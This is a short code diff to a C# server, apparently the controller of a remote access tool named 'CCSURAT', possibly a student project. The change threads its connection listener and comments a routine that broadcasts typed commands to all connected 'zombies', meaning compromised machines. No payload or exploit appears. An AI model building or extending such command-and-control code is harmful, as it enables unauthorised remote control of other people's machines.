@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Threading;
 using System.Windows.Forms;
 
 namespace CCSURAT_Server
@@ -22,11 +23,13 @@ namespace CCSURAT_Server
         {
             // start the connection listener on port, pass current zombies list
             listener = new Listener(this, zombies, listenPort);
-            listener.Start();
+            Thread thread = new Thread(new ThreadStart(listener.Listen));
+            thread.Start();
         }
 
         private void sendButton_Click(object sender, EventArgs e)
         {
+            // send data to all zombies.
             foreach(Zombie z in zombies)
             {
                 z.SendData(cmdTextbox.Text);
